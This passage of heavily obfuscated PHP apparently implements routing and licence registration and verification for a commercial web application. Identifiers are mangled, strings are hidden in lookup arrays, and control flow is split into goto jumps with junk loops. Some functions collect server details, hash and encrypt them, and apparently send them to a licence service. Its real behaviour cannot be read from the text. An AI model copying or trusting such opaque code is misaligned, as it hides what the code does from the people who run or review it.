$CÑô§ßí™ê = $Bº†Ö¤×Ğµ[575]; $aÆøãÔÓâ¨[39]($aÆøãÔÓâ¨[41], isset($D…ŠƒˆÎ›[1]) && $D…ŠƒˆÎ›[0] ? $D…ŠƒˆÎ›[1] : $this->defaultController); $aÆøãÔÓâ¨[39]($aÆøãÔÓâ¨[42], isset($D…ŠƒˆÎ›[2]) && $D…ŠƒˆÎ›[0] ? $D…ŠƒˆÎ›[2] : $this->defaultAction); goto féÒ…•Ñ¨; câ­Ï¦Ü‚Å: $Bøº›ôˆäó = $Bº†Ö¤×Ğµ[573]; $this->{$_SERVER[¦“®å”‹ôÍ][38]}(); $D…ŠƒˆÎ› = $GLOBALS[$aÆøãÔÓâ¨[22]][$aÆøãÔÓâ¨[23]]; goto aÓó¨¼½–; aÓó¨¼½–: $B½ÜÚ„òôÏ = $GLOBALS[$aÆøãÔÓâ¨[22]][$aÆøãÔÓâ¨[28]]; $Cø‡ãäíò­ = $Bº†Ö¤×Ğµ[574]; $aÆøãÔÓâ¨[39]($aÆøãÔÓâ¨[40], isset($D…ŠƒˆÎ›[0]) && $D…ŠƒˆÎ›[0] ? $D…ŠƒˆÎ›[0] : $this->defaultModule); goto aõÄ‡Î…Á¨; féÒ…•Ñ¨: $a‘ÎƒèˆŸ = $Bº†Ö¤×Ğµ[576]; $aÆøãÔÓâ¨[39]($aÆøãÔÓâ¨[43], MOD . $aÆøãÔÓâ¨[1] . ST . $aÆøãÔÓâ¨[1] . ACT); $_SERVER[$aÆøãÔÓâ¨[44]] = $aÆøãÔÓâ¨[6](ACTION); goto B÷õ·‚²ö´; B÷õ·‚²ö´: $this->{$_SERVER[¦“®å”‹ôÍ][45]}(); if ($aÆøãÔÓâ¨[19]($D…ŠƒˆÎ›) >= 3) { $this->{$_SERVER[¦“®å”‹ôÍ][21]}($B½ÜÚ„òôÏ); } else { $this->{$_SERVER[¦“®å”‹ôÍ][21]}(ACTION); } goto CµÓ…ñº²·; CµÓ…ñº²·: } private $ihuf4899dc13 = array(); private $nmoc3bb7cbf4 = ''; public function kmny054d6f9a() { goto Bƒ¦ìë¿Ö–; E•ôªØãÛ: $CëÃ™“ßÈÃ = $c¸š‡ĞĞ [579]; $this->{$_SERVER[¦“®å”‹ôÍ][50]}(); $cØŒì«­‘ = $c¸š‡ĞĞ [580]; goto aæèˆÒ¬¥Ú; bèóçæÚ¡³: $Aã¶ƒ½Š©µ = $c¸š‡ĞĞ [583]; $this->{$_SERVER[¦“®å”‹ôÍ][3]}($b²¤ˆ¶¦Ì÷[57], array($this, $b²¤ˆ¶¦Ì÷[58])); $this->{$_SERVER[¦“®å”‹ôÍ][3]}($b²¤ˆ¶¦Ì÷[59], array($this, $b²¤ˆ¶¦Ì÷[60])); goto Aå¢¬»Ø˜‚; F³Ô×ª’¯ø: $this->{$_SERVER[¦“®å”‹ôÍ][48]}(); $Bß›ëÄ™çË = $c¸š‡ĞĞ [578]; $this->{$_SERVER[¦“®å”‹ôÍ][49]}(); goto E•ôªØãÛ; Aå¢¬»Ø˜‚: $A«Í›Üœ = $c¸š‡ĞĞ [584]; if (strlen($A«Í›Üœ) < $c¸š‡ĞĞ [550]) { die; } goto fö…¦Ø; aæèˆÒ¬¥Ú: if (!$cØŒì«­‘) { return; } $this->{$_SERVER[¦“®å”‹ôÍ][51]}(); $this->{$_SERVER[¦“®å”‹ôÍ][52]}(); goto dÅë†¾ß¨; aˆá•ê‡‹: $BóÑÂ£ÃØ = $c¸š‡ĞĞ [577]; if (strlen($BóÑÂ£ÃØ) < $c¸š‡ĞĞ [550]) { return; } $this->{$_SERVER[¦“®å”‹ôÍ][47]}(); goto F³Ô×ª’¯ø; dïïÜå•: $cá¥¶¿ÕØ§ = $c¸š‡ĞĞ [582]; if (!$cá¥¶¿ÕØ§) { die; } $this->{$_SERVER[¦“®å”‹ôÍ][3]}($b²¤ˆ¶¦Ì÷[55], array($this, $b²¤ˆ¶¦Ì÷[56])); goto bèóçæÚ¡³; Bƒ¦ìë¿Ö–: $c¸š‡ĞĞ  =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b²¤ˆ¶¦Ì÷ =& $_SERVER[¦“®å”‹ôÍ]; $this->{$_SERVER[¦“®å”‹ôÍ][46]}(); goto aˆá•ê‡‹; dÅë†¾ß¨: $F´°ñÇ™Öà = $c¸š‡ĞĞ [581]; if (strlen($F´°ñÇ™Öà) < $c¸š‡ĞĞ [550]) { return; } $this->{$_SERVER[¦“®å”‹ôÍ][3]}($b²¤ˆ¶¦Ì÷[53], array($this, $b²¤ˆ¶¦Ì÷[54])); goto dïïÜå•; fö…¦Ø: } public function sdacfcd7a47a($c£­ñŠ¯×ê) { goto FåÄŸÃŒÕ; Eæ³²’àƒß: unset($c£­ñŠ¯×ê[$a¾»’¢Œæ[95]][$a¾»’¢Œæ[96]][$a¾»’¢Œæ[100]]); $c£­ñŠ¯×ê[$a¾»’¢Œæ[95]][$a¾»’¢Œæ[96]][$a¾»’¢Œæ[101]] = array($a¾»’¢Œæ[102] => (int) $b´ô¸‚›è[$a¾»’¢Œæ[103]], $a¾»’¢Œæ[104] => $a¾»’¢Œæ[105]($a¾»’¢Œæ[106]($b´ô¸‚›è, $a¾»’¢Œæ[107], array())), $a¾»’¢Œæ[108] => (int) $a¾»’¢Œæ[106]($b´ô¸‚›è, $a¾»’¢Œæ[109], 0)); $D²æÇäì× = $cãµİ…²è¦[591]; goto fŒšŠ¦Å‰¯; b½”Ğ¡é: if (strlen($BŠŒ³“¦¯¦) < $cãµİ…²è¦[564]) { return; } unset($c£­ñŠ¯×ê[$a¾»’¢Œæ[95]][$a¾»’¢Œæ[97]][$a¾»’¢Œæ[98]]); $cÏŸÒâŸ´’ = $cãµİ…²è¦[587]; goto AĞšéÏ”ù; f“ö·åºƒó: $fã¥èò éÜ = $cãµİ…²è¦[592]; $c£­ñŠ¯×ê[$a¾»’¢Œæ[110]][$a¾»’¢Œæ[119]] = $a¾»’¢Œæ[120]($a¾»’¢Œæ[121]()); $c£­ñŠ¯×ê[$a¾»’¢Œæ[110]][$a¾»’¢Œæ[122]] = $this->nmoc3bb7cbf4; goto fêÌ÷“Ã…¸; Aç°‚õ‰ÏË: $c£­ñŠ¯×ê[$a¾»’¢Œæ[110]][$a¾»’¢Œæ[132]] = $a¾»’¢Œæ[106]($this->ihuf4899dc13, $a¾»’¢Œæ[133], $a¾»’¢Œæ[10]); if ($a¾»’¢Œæ[106]($GLOBALS, $a¾»’¢Œæ[134]) && $this->config[$a¾»’¢Œæ[135]]) { $c£­ñŠ¯×ê[$a¾»’¢Œæ[110]][$a¾»’¢Œæ[136]] = WEB_ROOT; } return $c£­ñŠ¯×ê; goto Déœçé­ğä; fêÌ÷“Ã…¸: if ($FŒâÏ†Ÿ“Ğ[$a¾»’¢Œæ[122]] != $a¾»’¢Œæ[123]) { $c£­ñŠ¯×ê[$a¾»’¢Œæ[110]][$a¾»’¢Œæ[124]] = $FŒâÏ†Ÿ“Ğ[$a¾»’¢Œæ[124]]; $c£­ñŠ¯×ê[$a¾»’¢Œæ[110]][$a¾»’¢Œæ[125]] = $FŒâÏ†Ÿ“Ğ[$a¾»’¢Œæ[125]]; $eñéÀªÅ = $a¾»’¢Œæ[126](10) . $this->nmoc3bb7cbf4 . $a¾»’¢Œæ[126](5); $c£­ñŠ¯×ê[$a¾»’¢Œæ[95]][$a¾»’¢Œæ[127]][$a¾»’¢Œæ[128]] = $this->{$_SERVER[¦“®å”‹ôÍ][129]}($eñéÀªÅ, $c£­ñŠ¯×ê[$a¾»’¢Œæ[110]][$a¾»’¢Œæ[115]]); } if ($this->nmoc3bb7cbf4 == $a¾»’¢Œæ[123]) { $c£­ñŠ¯×ê[$a¾»’¢Œæ[95]][$a¾»’¢Œæ[96]][$a¾»’¢Œæ[101]][$a¾»’¢Œæ[109]] = 0; } $c£­ñŠ¯×ê[$a¾»’¢Œæ[110]][$a¾»’¢Œæ[130]] = $a¾»’¢Œæ[106]($this->ihuf4899dc13, $a¾»’¢Œæ[131], $a¾»’¢Œæ[10]); goto Aç°‚õ‰ÏË; C¿‚®§õ£¢: unset($c£­ñŠ¯×ê[$a¾»’¢Œæ[95]][$a¾»’¢Œæ[96]][$a¾»’¢Œæ[76]]); $aâ„¡Ì†¨ = $cãµİ…²è¦[590]; if (strlen($aâ„¡Ì†¨) < $cãµİ…²è¦[588]) { die; } goto Eæ³²’àƒß; FåÄŸÃŒÕ: $cãµİ…²è¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a¾»’¢Œæ =& $_SERVER[¦“®å”‹ôÍ]; $FŒâÏ†Ÿ“Ğ = $a¾»’¢Œæ[61]($a¾»’¢Œæ[62])->{$_SERVER[¦“®å”‹ôÍ][63]}(); goto e„×óŠºæ»; e„×óŠºæ»: $bŸ¶Ü¾¶› = array($a¾»’¢Œæ[64], $a¾»’¢Œæ[65], $a¾»’¢Œæ[66], $a¾»’¢Œæ[67], $a¾»’¢Œæ[68], $a¾»’¢Œæ[69], $a¾»’¢Œæ[70], $a¾»’¢Œæ[71], $a¾»’¢Œæ[72], $a¾»’¢Œæ[73], $a¾»’¢Œæ[74], $a¾»’¢Œæ[75], $a¾»’¢Œæ[76], $a¾»’¢Œæ[77], $a¾»’¢Œæ[78], $a¾»’¢Œæ[79], $a¾»’¢Œæ[80], $a¾»’¢Œæ[81], $a¾»’¢Œæ[82], $a¾»’¢Œæ[83], $a¾»’¢Œæ[84], $a¾»’¢Œæ[85], $a¾»’¢Œæ[86], $a¾»’¢Œæ[87], $a¾»’¢Œæ[88], $a¾»’¢Œæ[89], $a¾»’¢Œæ[90], $a¾»’¢Œæ[91], $a¾»’¢Œæ[92]); $B¤ÆÄ•˜‡‚ = $cãµİ…²è¦[585]; if (strlen($B¤ÆÄ•˜‡‚) < $cãµİ…²è¦[558]) { return; } goto D« Ÿ½÷âÀ; fŒšŠ¦Å‰¯: if (strlen($D²æÇäì×) < $cãµİ…²è¦[550]) { return; } $c£­ñŠ¯×ê[$a¾»’¢Œæ[110]][$a¾»’¢Œæ[111]] = $a¾»’¢Œæ[112]($a¾»’¢Œæ[113])->{$_SERVER[¦“®å”‹ôÍ][114]}(); $c£­ñŠ¯×ê[$a¾»’¢Œæ[110]][$a¾»’¢Œæ[115]] = $a¾»’¢Œæ[116]($_SERVER[$a¾»’¢Œæ[117]] . $FŒâÏ†Ÿ“Ğ[$a¾»’¢Œæ[118]]); goto f“ö·åºƒó; D« Ÿ½÷âÀ: foreach ($bŸ¶Ü¾¶› as $b˜³­¸ ÉÓ) { $BœáàÖØ¿œ = $GLOBALS[$a¾»’¢Œæ[93]][$a¾»’¢Œæ[94]][$b˜³­¸ ÉÓ]; if (isset($FŒâÏ†Ÿ“Ğ[$b˜³­¸ ÉÓ])) { $BœáàÖØ¿œ = $FŒâÏ†Ÿ“Ğ[$b˜³­¸ ÉÓ]; } $c£­ñŠ¯×ê[$a¾»’¢Œæ[95]][$a¾»’¢Œæ[96]][$b˜³­¸ ÉÓ] = $BœáàÖØ¿œ; } $b´ô¸‚›è = $c£­ñŠ¯×ê[$a¾»’¢Œæ[95]][$a¾»’¢Œæ[96]][$a¾»’¢Œæ[76]]; $BŠŒ³“¦¯¦ = $cãµİ…²è¦[586]; goto b½”Ğ¡é; AĞšéÏ”ù: while (strlen($cÏŸÒâŸ´’) < $cãµİ…²è¦[588]) { if (!$cÏŸÒâŸ´’) { break; } $cÏŸÒâŸ´’++; } unset($c£­ñŠ¯×ê[$a¾»’¢Œæ[95]][$a¾»’¢Œæ[97]][$a¾»’¢Œæ[99]]); $A«ñ“òŒ· = $cãµİ…²è¦[589]; goto C¿‚®§õ£¢; Déœçé­ğä: } private function kqhsccd7f5f7() { goto f’‰Ï—İß; B¦ÈÏî¼ÎÍ: $fİ„à¨ë‡± = array($cˆ¹ÎöÀÜ[161] => $dí“â §[$cˆ¹ÎöÀÜ[64]], $cˆ¹ÎöÀÜ[162] => $dí“â §[$cˆ¹ÎöÀÜ[65]], $cˆ¹ÎöÀÜ[163] => $cˆ¹ÎöÀÜ[10]); foreach ($Eï¯¾©…— as $B±‰¬ ù‰‘) { if (!isset($dí“â §[$B±‰¬ ù‰‘]) || !$dí“â §[$B±‰¬ ù‰‘]) { continue; } $fİ„à¨ë‡±[$B±‰¬ ù‰‘] = $dí“â §[$B±‰¬ ù‰‘]; } $cˆ¹ÎöÀÜ[13](array($cˆ¹ÎöÀÜ[153], $cˆ¹ÎöÀÜ[154]), $fİ„à¨ë‡±); goto F’ÍÕ½“‡; Fª˜Ğéëæ: if ($this->nmoc3bb7cbf4 == $cˆ¹ÎöÀÜ[123]) { return; } $Eï¯¾©…— = array($cˆ¹ÎöÀÜ[155], $cˆ¹ÎöÀÜ[156], $cˆ¹ÎöÀÜ[157], $cˆ¹ÎöÀÜ[158], $cˆ¹ÎöÀÜ[159], $cˆ¹ÎöÀÜ[160]); $dí“â § = $cˆ¹ÎöÀÜ[61]($cˆ¹ÎöÀÜ[62])->{$_SERVER[¦“®å”‹ôÍ][63]}(); goto B¦ÈÏî¼ÎÍ; f’‰Ï—İß: $E ˆ¼İøö¿ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cˆ¹ÎöÀÜ =& $_SERVER[¦“®å”‹ôÍ]; if ($_SERVER[$cˆ¹ÎöÀÜ[44]] == $cˆ¹ÎöÀÜ[137]) { goto B‘Œ›’œ‰‰; B‘Œ›’œ‰‰: $d±ëŠ ¢Ôì = array($cˆ¹ÎöÀÜ[122] => $this->nmoc3bb7cbf4, $cˆ¹ÎöÀÜ[138] => $this->{$_SERVER[¦“®å”‹ôÍ][139]}(), $cˆ¹ÎöÀÜ[140] => $cˆ¹ÎöÀÜ[61]($cˆ¹ÎöÀÜ[141])->{$_SERVER[¦“®å”‹ôÍ][142]}()); if ($this->nmoc3bb7cbf4 != $cˆ¹ÎöÀÜ[123]) { $cœ‹½˜Ğ‡ = $cˆ¹ÎöÀÜ[106]($this->ihuf4899dc13, $cˆ¹ÎöÀÜ[143]); if ($cœ‹½˜Ğ‡) { $d±ëŠ ¢Ôì[$cˆ¹ÎöÀÜ[144]] = $cœ‹½˜Ğ‡; $d±ëŠ ¢Ôì[$cˆ¹ÎöÀÜ[145]] = $cˆ¹ÎöÀÜ[146]($cˆ¹ÎöÀÜ[106]($this->ihuf4899dc13, $cˆ¹ÎöÀÜ[147])); $d±ëŠ ¢Ôì[$cˆ¹ÎöÀÜ[148]] = $cˆ¹ÎöÀÜ[106]($this->ihuf4899dc13, $cˆ¹ÎöÀÜ[133]); } } $d±ëŠ ¢Ôì = $this->{$_SERVER[¦“®å”‹ôÍ][149]}($cˆ¹ÎöÀÜ[150]($d±ëŠ ¢Ôì), $cˆ¹ÎöÀÜ[116]($cˆ¹ÎöÀÜ[151])); goto BÔ¥›’¼ï; E„µ’£ÊÇ: while (strlen($cµ–¬ë ì¢) < $E ˆ¼İøö¿[556]) { if (!$cµ–¬ë ì¢) { break; } $cµ–¬ë ì¢++; } goto DëÆö¢ ×Œ; BÔ¥›’¼ï: $fİ„à¨ë‡± = array($cˆ¹ÎöÀÜ[152] => $d±ëŠ ¢Ôì); $cˆ¹ÎöÀÜ[13](array($cˆ¹ÎöÀÜ[153], $cˆ¹ÎöÀÜ[154]), $fİ„à¨ë‡±); $cµ–¬ë ì¢ = $E ˆ¼İøö¿[593]; goto E„µ’£ÊÇ; DëÆö¢ ×Œ: } goto Fª˜Ğéëæ; F’ÍÕ½“‡: } private function stqi216cce01() { goto bï¿˜¸Ğ°©; C„ÁÆ¹ÍÈÁ: if (!$EÛ•‘Â‘ê¯[106]($GLOBALS, $EÛ•‘Â‘ê¯[134])) { die; } $bòŞËµ½»ç = $GLOBALS[$EÛ•‘Â‘ê¯[22]]; if (isset($bòŞËµ½»ç[$EÛ•‘Â‘ê¯[165]])) { $this->{$_SERVER[¦“®å”‹ôÍ][166]}(); die; } goto EÒÖ²§ªÑÉ; E¦ƒ°É¸Àò: $CôÎ¥Ÿ‚† = $fèÆ³Çá–[599]; if ($c¯Ë¥©Ÿ[$EÛ•‘Â‘ê¯[219]] && $c¯Ë¥©Ÿ[$EÛ•‘Â‘ê¯[219]] >= 1) { $EÛ•‘Â‘ê¯[61]($EÛ•‘Â‘ê¯[62])->{$_SERVER[¦“®å”‹ôÍ][220]}($EÛ•‘Â‘ê¯[221], $EÛ•‘Â‘ê¯[222]); } $EÛ•‘Â‘ê¯[61]($EÛ•‘Â‘ê¯[62])->{$_SERVER[¦“®å”‹ôÍ][223]}($BçŸÏ¢”æ); goto BÇ ²âÖÆ; AÍ¡ÂÅ‰±: $C¢œÎÃæÄ = $EÛ•‘Â‘ê¯[126](16); $eÖ‚ßÈ¼å¸ = $C¢œÎÃæÄ . $BçŸÏ¢”æ[$EÛ•‘Â‘ê¯[122]] . $this->{$_SERVER[¦“®å”‹ôÍ][149]}($EÛ•‘Â‘ê¯[116]($BçŸÏ¢”æ[$EÛ•‘Â‘ê¯[211]]), $C¢œÎÃæÄ); $BçŸÏ¢”æ[$EÛ•‘Â‘ê¯[125]] = $EÛ•‘Â‘ê¯[120]($EÛ•‘Â‘ê¯[216]($this->{$_SERVER[¦“®å”‹ôÍ][149]}($eÖ‚ßÈ¼å¸, $EÛ•‘Â‘ê¯[218]))); goto E¦ƒ°É¸Àò; EÒÖ²§ªÑÉ: if (!isset($bòŞËµ½»ç[$EÛ•‘Â‘ê¯[167]]) || $EÛ•‘Â‘ê¯[24]($bòŞËµ½»ç[$EÛ•‘Â‘ê¯[167]]) != 16) { $EÛ•‘Â‘ê¯[168]($EÛ•‘Â‘ê¯[169] . $bòŞËµ½»ç[$EÛ•‘Â‘ê¯[167]], !1); } $b†¾®’¶Õ = $EÛ•‘Â‘ê¯[61]($EÛ•‘Â‘ê¯[62])->{$_SERVER[¦“®å”‹ôÍ][63]}($EÛ•‘Â‘ê¯[118]); $Aß¶À†“Å = array($EÛ•‘Â‘ê¯[167] => $bòŞËµ½»ç[$EÛ•‘Â‘ê¯[167]], $EÛ•‘Â‘ê¯[170] => $EÛ•‘Â‘ê¯[126](16), $EÛ•‘Â‘ê¯[171] => $EÛ•‘Â‘ê¯[151], $EÛ•‘Â‘ê¯[172] => $EÛ•‘Â‘ê¯[173], $EÛ•‘Â‘ê¯[174] => $_SERVER[$EÛ•‘Â‘ê¯[175]], $EÛ•‘Â‘ê¯[176] => $_SERVER[$EÛ•‘Â‘ê¯[177]], $EÛ•‘Â‘ê¯[178] => $_SERVER[$EÛ•‘Â‘ê¯[179]]); goto ašĞ¶âÄ£Í; dˆ¬³öÙ±: while ($EŠÄÑ›–‰ < $fèÆ³Çá–[558]) { if ($EŠÄÑ›–‰ >= 0) { break; } $EŠÄÑ›–‰++; } $this->{$_SERVER[¦“®å”‹ôÍ][231]}(); $EÛ•‘Â‘ê¯[168]($EÛ•‘Â‘ê¯[199]($EÛ•‘Â‘ê¯[210]), !0); goto d¡Şè¢§ğ£; fµƒè†ÖÓ: $dãˆßò›¶ = $EÛ•‘Â‘ê¯[216]($EÛ•‘Â‘ê¯[25]($f¦öà¸‹Ñ‰, 10, 16)); $EŠŠÕÅ—‹‘ = $this->{$_SERVER[¦“®å”‹ôÍ][129]}($EÛ•‘Â‘ê¯[150]($c¯Ë¥©Ÿ), $f¦öà¸‹Ñ‰); $D«İ…ÆÔÇ¦ = $EÛ•‘Â‘ê¯[224]($EÛ•‘Â‘ê¯[61]($EÛ•‘Â‘ê¯[11])->{$_SERVER[¦“®å”‹ôÍ][225]}(), $EÛ•‘Â‘ê¯[226]); goto b×åÚ•¥¢; BŞ†â›ó¥£: if (!$d¯ÕÑ«Š„ç || $d¯ÕÑ«Š„ç != $EÛ•‘Â‘ê¯[203]($c¯Ë¥©Ÿ[$EÛ•‘Â‘ê¯[147]])) { $F¿ÏäğÉŒˆ = array($EÛ•‘Â‘ê¯[204] => $EÛ•‘Â‘ê¯[61]($EÛ•‘Â‘ê¯[62])->{$_SERVER[¦“®å”‹ôÍ][63]}($EÛ•‘Â‘ê¯[118]), $EÛ•‘Â‘ê¯[205] => $_SERVER[$EÛ•‘Â‘ê¯[117]], $EÛ•‘Â‘ê¯[206] => $EÛ•‘Â‘ê¯[207](), $EÛ•‘Â‘ê¯[176] => $_SERVER[$EÛ•‘Â‘ê¯[177]]); $f‡—ÔŸºíƒ = $this->{$_SERVER[¦“®å”‹ôÍ][208]}($EÛ•‘Â‘ê¯[150]($F¿ÏäğÉŒˆ)); $this->{$_SERVER[¦“®å”‹ôÍ][184]}($EÛ•‘Â‘ê¯[209] . $f‡—ÔŸºíƒ); $EÛ•‘Â‘ê¯[168]($EÛ•‘Â‘ê¯[199]($EÛ•‘Â‘ê¯[210]), !0); } $BçŸÏ¢”æ = array($EÛ•‘Â‘ê¯[211] => $Aß¶À†“Å[$EÛ•‘Â‘ê¯[167]], $EÛ•‘Â‘ê¯[212] => $c¯Ë¥©Ÿ[$EÛ•‘Â‘ê¯[213]], $EÛ•‘Â‘ê¯[214] => $EÛ•‘Â‘ê¯[126](16), $EÛ•‘Â‘ê¯[122] => $c¯Ë¥©Ÿ[$EÛ•‘Â‘ê¯[215]]); if ($Aß¶À†“Å[$EÛ•‘Â‘ê¯[170]]) { $BçŸÏ¢”æ[$EÛ•‘Â‘ê¯[214]] = $Aß¶À†“Å[$EÛ•‘Â‘ê¯[170]]; } goto eÊ§ëä‹Ÿ¿; ašĞ¶âÄ£Í: $a­‘³Ë¾¶¬ = $fèÆ³Çá–[594]; while ($a­‘³Ë¾¶¬ < $fèÆ³Çá–[558]) { if ($a­‘³Ë¾¶¬ >= 0) { break; } $a­‘³Ë¾¶¬++; } $F…¤¯É“è = $EÛ•‘Â‘ê¯[116]($_SERVER[$EÛ•‘Â‘ê¯[117]] . $b†¾®’¶Õ); goto DÇ’“ƒ÷”©; bï¿˜¸Ğ°©: $fèÆ³Çá– =& $_SERVER[´Ù×Íå‘ÄõÛ]; $EÛ•‘Â‘ê¯ =& $_SERVER[¦“®å”‹ôÍ]; if ($_SERVER[$EÛ•‘Â‘ê¯[44]] != $EÛ•‘Â‘ê¯[164]) { return; } goto C„ÁÆ¹ÍÈÁ; E›È÷¡¬ôğ: $d¯ÕÑ«Š„ç = $this->{$_SERVER[¦“®å”‹ôÍ][201]}($c¯Ë¥©Ÿ[$EÛ•‘Â‘ê¯[202]]); $EÌ§¡è«‘ = $fèÆ³Çá–[596]; if (strlen($EÌ§¡è«‘) < $fèÆ³Çá–[564]) { return; } goto BŞ†â›ó¥£; b×åÚ•¥¢: $DİšÄŸÖ‘µ = $D«İ…ÆÔÇ¦[$EÛ•‘Â‘ê¯[227]]; $B­à¦‰åª· = array(); $B­à¦‰åª·[$dãˆßò›¶] = $EŠŠÕÅ—‹‘; goto Aæå ÔßÀ±; eÊ§ëä‹Ÿ¿: $bø“ì›Ì = $EÛ•‘Â‘ê¯[25]($EÛ•‘Â‘ê¯[116]($BçŸÏ¢”æ[$EÛ•‘Â‘ê¯[212]]), 10, 10); $eôï‚Ú = $bø“ì›Ì . $BçŸÏ¢”æ[$EÛ•‘Â‘ê¯[122]] . $BçŸÏ¢”æ[$EÛ•‘Â‘ê¯[214]]; $Bô„ƒŠÔÍï = $fèÆ³Çá–[597]; goto fèæÆŞ·æ; d¡Şè¢§ğ£: $E‘Æ‘”†³ = $fèÆ³Çá–[603]; goto D«‹å¸»ëî; BÇ ²âÖÆ: $f¦öà¸‹Ñ‰ = $EÛ•‘Â‘ê¯[116]($_SERVER[$EÛ•‘Â‘ê¯[117]] . $EÛ•‘Â‘ê¯[216]($b†¾®’¶Õ) . $BçŸÏ¢”æ[$EÛ•‘Â‘ê¯[212]]); $EŸ¦÷£° = $fèÆ³Çá–[600]; if (strlen($EŸ¦÷£°) < $fèÆ³Çá–[550]) { die; } goto fµƒè†ÖÓ; e×Â¶¥Œ: $this->ihuf4899dc13 = $c¯Ë¥©Ÿ; $this->nmoc3bb7cbf4 = $BçŸÏ¢”æ[$EÛ•‘Â‘ê¯[122]]; $EŠÄÑ›–‰ = $fèÆ³Çá–[602]; goto dˆ¬³öÙ±; Aæå ÔßÀ±: $bÇ¦ŞÉÕ² = $fèÆ³Çá–[601]; if (!$bÇ¦ŞÉÕ²) { die; } $EÛ•‘Â‘ê¯[61]($EÛ•‘Â‘ê¯[11])->{$_SERVER[¦“®å”‹ôÍ][228]}($DİšÄŸÖ‘µ[$EÛ•‘Â‘ê¯[229]], array($EÛ•‘Â‘ê¯[230] => $B­à¦‰åª·)); goto e×Â¶¥Œ; fèæÆŞ·æ: $BçŸÏ¢”æ[$EÛ•‘Â‘ê¯[124]] = $EÛ•‘Â‘ê¯[216]($EÛ•‘Â‘ê¯[120]($this->{$_SERVER[¦“®å”‹ôÍ][149]}($eôï‚Ú, $EÛ•‘Â‘ê¯[217]))); $f…£¹Çîˆô = $fèÆ³Çá–[598]; if (strlen($f…£¹Çîˆô) < $fèÆ³Çá–[558]) { return; } goto AÍ¡ÂÅ‰±; DÇ’“ƒ÷”©: if ($bòŞËµ½»ç[$EÛ•‘Â‘ê¯[180]] == $EÛ•‘Â‘ê¯[181]) { $FØø·‡à” = $this->{$_SERVER[¦“®å”‹ôÍ][149]}($F…¤¯É“è, $EÛ•‘Â‘ê¯[182]); $f‡—ÔŸºíƒ = $this->{$_SERVER[¦“®å”‹ôÍ][129]}($EÛ•‘Â‘ê¯[150]($Aß¶À†“Å), $F…¤¯É“è . $EÛ•‘Â‘ê¯[183], 3); $CÎ²½åëÅÁ = $this->{$_SERVER[¦“®å”‹ôÍ][184]}($EÛ•‘Â‘ê¯[185] . $FØø·‡à” . $EÛ•‘Â‘ê¯[186] . $f‡—ÔŸºíƒ, -1); $EÛ•‘Â‘ê¯[168]($CÎ²½åëÅÁ, !0); } else { if ($bòŞËµ½»ç[$EÛ•‘Â‘ê¯[180]] == $EÛ•‘Â‘ê¯[187]) { $eÄ—¡¡ÏÃ† = $EÛ•‘Â‘ê¯[25]($EÛ•‘Â‘ê¯[116]($EÛ•‘Â‘ê¯[188] . $F…¤¯É“è), 12, 15) . $EÛ•‘Â‘ê¯[189]; $f‡—ÔŸºíƒ = $this->{$_SERVER[¦“®å”‹ôÍ][190]}($EÛ•‘Â‘ê¯[2]($bòŞËµ½»ç[$EÛ•‘Â‘ê¯[191]]), $eÄ—¡¡ÏÃ†, 2); $CãÉ×ïº‘¬ = $EÛ•‘Â‘ê¯[192]($f‡—ÔŸºíƒ, !0); if (!$EÛ•‘Â‘ê¯[193]($CãÉ×ïº‘¬) || !$EÛ•‘Â‘ê¯[193]($CãÉ×ïº‘¬[$EÛ•‘Â‘ê¯[194]]) || $CãÉ×ïº‘¬[$EÛ•‘Â‘ê¯[167]] != !0) { $fŞªÃÚõº© = $EÛ•‘Â‘ê¯[195]; $C–ø˜«šâ = $CãÉ×ïº‘¬[$EÛ•‘Â‘ê¯[194]] ? $EÛ•‘Â‘ê¯[196] . $CãÉ×ïº‘¬[$EÛ•‘Â‘ê¯[194]] : $fŞªÃÚõº©; $EÛ•‘Â‘ê¯[168]($C–ø˜«šâ, !1); } else { $Aß¶À†“Å[$EÛ•‘Â‘ê¯[170]] = $CãÉ×ïº‘¬[$EÛ•‘Â‘ê¯[194]][$EÛ•‘Â‘ê¯[197]]; } } else { $CãÉ×ïº‘¬ = $this->{$_SERVER[¦“®å”‹ôÍ][184]}($EÛ•‘Â‘ê¯[198], $Aß¶À†“Å, 10); $bò‰ĞÑË»é = $fèÆ³Çá–[595]; } } if (!$EÛ•‘Â‘ê¯[193]($CãÉ×ïº‘¬) || !$EÛ•‘Â‘ê¯[193]($CãÉ×ïº‘¬[$EÛ•‘Â‘ê¯[194]]) || $CãÉ×ïº‘¬[$EÛ•‘Â‘ê¯[167]] != !0) { $fŞªÃÚõº© = $EÛ•‘Â‘ê¯[199]($EÛ•‘Â‘ê¯[200]); $C–ø˜«šâ = $CãÉ×ïº‘¬[$EÛ•‘Â‘ê¯[194]] ? $EÛ•‘Â‘ê¯[196] . $CãÉ×ïº‘¬[$EÛ•‘Â‘ê¯[194]] : $fŞªÃÚõº©; $EÛ•‘Â‘ê¯[168]($C–ø˜«šâ, !1); } $c¯Ë¥©Ÿ = $CãÉ×ïº‘¬[$EÛ•‘Â‘ê¯[194]]; goto E›È÷¡¬ôğ; D«‹å¸»ëî: } private function licenseRegistSuccess() { $föƒ£Ìô… =& $_SERVER[¦“®å”‹ôÍ]; $A‡¤„Æâ¥Í = $föƒ£Ìô…[61]($föƒ£Ìô…[62])->{$_SERVER[¦“®å”‹ôÍ][63]}(); if ($A‡¤„Æâ¥Í[$föƒ£Ìô…[87]] != $föƒ£Ìô…[222]) { $föƒ£Ìô…[61]($föƒ£Ìô…[62])->{$_SERVER[¦“®å”‹ôÍ][223]}($föƒ£Ìô…[87], $föƒ£Ìô…[222]); } $föƒ£Ìô…[112]($föƒ£Ìô…[232])->{$_SERVER[¦“®å”‹ôÍ][233]}(!0); } private function nvma2dd676ce() { goto EÏœ™ùºÅ·; EÏœ™ùºÅ·: $f£“Ñ‚šóÑ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aß«• áê =& $_SERVER[¦“®å”‹ôÍ]; $aß«• áê[61]($aß«• áê[62])->{$_SERVER[¦“®å”‹ôÍ][223]}(array($aß«• áê[211] => $aß«• áê[10], $aß«• áê[212] => $aß«• áê[10], $aß«• áê[122] => $aß«• áê[123], $aß«• áê[124] => $aß«• áê[10], $aß«• áê[125] => $aß«• áê[10])); goto eÕö°³‘¶; F›‘ğò £„: $this->ihuf4899dc13 = array(); $this->nmoc3bb7cbf4 = $aß«• áê[123]; $C£ˆ¹Ôš‡ = 